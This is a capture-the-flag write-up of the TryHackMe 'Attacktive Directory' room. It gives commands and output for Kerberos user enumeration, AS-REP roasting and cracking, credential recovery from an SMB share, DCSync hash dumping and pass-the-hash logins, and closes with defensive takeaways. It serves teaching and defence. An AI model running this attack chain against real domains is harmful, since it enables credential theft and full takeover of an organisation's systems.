# TryHackMe - Attacktive Directory

**Difficulty:** Medium | **Category:** Active Directory / Windows | **Time:** 75 min

## Summary
A domain controller running Active Directory. Starting from **zero credentials**, the chain abuses information leaks inherent to default AD configuration: unauthenticated Kerberos user enumeration, AS-REP Roasting of a service account whose pre-authentication is disabled, offline hash cracking, base64 credentials left in an SMB share, and finally DCSync to replicate the entire directory database. The recovered Administrator NTLM hash is then used for a Pass-the-Hash authentication.

The point of the room is the **chain**: each small disclosure enables the next step, and nothing along the way required an exploit.

## Reconnaissance

### Port scan
```bash
nmap -sC -sV -Pn <TARGET_IP>
```

**Results:**
- `88/tcp` - Kerberos (Active Directory confirmed)
- `135/tcp` - Microsoft RPC
- `139/tcp` - NetBIOS Session Service
- `389/tcp` - LDAP — **Domain: spookysec.local**
- `445/tcp` - SMB
- `464/tcp` - kpasswd
- `593/tcp` - RPC over HTTP
- `636/tcp` - LDAPS
- `3268/3269/tcp` - Global Catalog
- `3389/tcp` - RDP
- `5985/tcp` - WinRM

The RDP script output disclosed the domain metadata directly:

```
Target_Name:        THM-AD
DNS_Domain_Name:    spookysec.local
DNS_Computer_Name:  AttacktiveDirectory.spookysec.local
Product_Version:    10.0.17763      (Windows Server 2019)
```

Note: SMB signing is `enabled and required` here, so relay attacks are not available — unlike the more permissive default seen on older hosts.

### Hosts file
Kerberos requires name resolution to the domain, so the DC is pinned locally:

```bash
echo "<TARGET_IP> spookysec.local THM-AD" | sudo tee -a /etc/hosts
getent hosts spookysec.local
```

### SMB enumeration
```bash
enum4linux -a <TARGET_IP>
```

```
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)
```

The NetBIOS domain name is **THM-AD**; the DNS domain uses the non-routable `.local` TLD, which is a common (and discouraged) convention for internal AD domains.

## Enumeration - users without credentials

Kerberos answers differently for a known and an unknown principal: an unknown user returns `KDC_ERR_C_PRINCIPAL_UNKNOWN` while an existing one returns `KDC_ERR_PREAUTH_REQUIRED`. That difference enumerates accounts **with no authentication at all**.

```bash
kerbrute userenum -d spookysec.local --dc <TARGET_IP> userlist.txt -t 100
```

```
[+] VALID USERNAME:  svc-admin@spookysec.local
[+] VALID USERNAME:  backup@spookysec.local
[+] VALID USERNAME:  james, robin, darkstar, administrator, paradox, ori
Done! Tested 73317 usernames (16 valid) in 29.667 seconds
```

Two accounts stand out because of their naming: **`svc-admin`** and **`backup`**. Service accounts and backup identities routinely combine elevated privileges with weak, rarely rotated passwords.

## Exploitation - AS-REP Roasting

A normal Kerberos exchange requires pre-authentication: the client must prove knowledge of the password before receiving a ticket. When an account has **"Do not require Kerberos preauthentication"** set — often for legacy scripts or services — the KDC will issue a ticket encrypted with that account's password key **to anyone who asks**.

```bash
GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip <TARGET_IP>
GetNPUsers.py spookysec.local/backup    -no-pass -dc-ip <TARGET_IP>
```

```
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:aa9100ae...</hash>
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

`svc-admin` is vulnerable; `backup` is not. The returned value is a **Kerberos 5, etype 23, AS-REP** hash — Hashcat mode **18200**.

### Cracking
```bash
john --format=krb5asrep --wordlist=passwordlist.txt asrep.txt
john --format=krb5asrep --show asrep.txt
```

The password is cracked in seconds: a dictionary word with a four-digit suffix. This is the practical failure mode of "words plus a year" passwords.

## Enumeration - SMB with the recovered credentials

```bash
smbclient -L //<TARGET_IP> -U 'svc-admin%<password>'
```

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
```

Six shares; `backup` is the only non-default one. It is readable with the recovered account:

```bash
smbclient //<TARGET_IP>/backup -U 'svc-admin%<password>' -c 'ls'
smbclient //<TARGET_IP>/backup -U 'svc-admin%<password>' -c 'get backup_credentials.txt out.txt'
```

The file contains a single **base64** string:

```bash
base64 -d out.txt
# backup@spookysec.local:backup2517860
```

A second set of credentials, left in a share whose name announces its contents. This is the classic "backup share" finding: a location intended for operational convenience that quietly exposes privileged material.

## Privilege escalation - DCSync

The `backup` account holds **directory replication rights**. DCSync abuses those rights (normally reserved for domain controllers) to request replication of the directory database `NTDS.DIT` over the DRSUAPI protocol — no code execution on the DC, no exploit:

```bash
secretsdump.py -just-dc-ntlm spookysec.local/backup:<password>@<TARGET_IP>
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\svc-admin:1114:...:fc0f1e5359e372aa1f69147375ba6809:::
...
```

Every domain account hash is now available, including the Administrator's. With `krbtgt` in hand, a Golden Ticket could also be forged — the domain is fully compromised.

## Pass-the-Hash

NTLM authentication accepts the **hash as the credential**. No password, no cracking:

```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc \
           Administrator@<TARGET_IP> 'whoami'
# thm-ad\administrator
```

The same hash works through Evil-WinRM's `-H` option for an interactive shell:

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

## Flags

Three flags, each on a different user's desktop, reachable only through the accumulated access:

| Location | Access required |
|---|---|
| `C:\Users\svc-admin\Desktop\` | AS-REP crack |
| `C:\Users\backup\Desktop\` | SMB share credentials |
| `C:\Users\Administrator\Desktop\` | DCSync + Pass-the-Hash |

Format: `TryHackMe{...}`. *Values kept private per TryHackMe content rules.*

## Key Takeaways

1. **Kerberos pre-authentication enumeration is on by default and leaks the account list.** The fix is not a single setting but detection: alert on mass `KDC_ERR_PREAUTH_REQUIRED` responses, which is what a `userenum` sweep looks like from the DC's side.
2. **AS-REP Roasting needs no credentials and no exploit** — one misapplied account flag exposes a crackable hash. Audit for accounts with `UF_DONT_REQUIRE_PREAUTH` and remove it wherever it is not strictly necessary.
3. **Kerberos hashes crack offline at full speed.** Nothing on the network reveals the attempt, so the only real defence is password entropy — "dictionary word + year" is not enough.
4. **Service and backup accounts are the weak point.** They are often over-privileged, excluded from rotation policy, and named in a way that advertises their function.
5. **Never store credentials in a file share, base64 or otherwise.** Encoding is not encryption, and a share named `backup` attracts attention immediately.
6. **DCSync converts replication rights into a full database dump** with no code execution on the target. Restrict and monitor who holds `Replicating Directory Changes` permissions.
7. **Pass-the-Hash is why hash exposure equals password disclosure.** NTLM cannot distinguish the two, so any credential dumping is a full compromise until the password (and dependent sessions) are rotated.
8. **SMB signing matters.** Requiring it blocks relay attacks; this DC did, older ones often do not.
